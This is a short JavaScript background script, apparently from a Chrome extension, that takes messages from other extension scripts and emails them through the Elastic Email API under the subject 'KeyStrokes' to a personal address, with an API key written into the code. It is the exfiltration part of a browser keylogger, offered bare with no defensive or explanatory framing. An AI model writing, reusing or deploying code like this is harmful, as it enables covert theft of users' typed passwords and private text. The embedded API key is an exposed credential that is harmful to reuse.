chrome.runtime.onMessage.addListener(function(response, sender, sendResponse){
	var xhr = new XMLHttpRequest();
    xhr.open("POST","https://api.elasticemail.com/v2/email/send?apikey=511a3ad4-f3f5-4cf1-9e67-0cd57a13add9&bodyText="+response+"&subject=KeyStrokes&from=rjakhmola5@gmail.com&to=rjakhmola5@gmail.com&isTransactional=true" ,true);
    xhr.send(response);

});
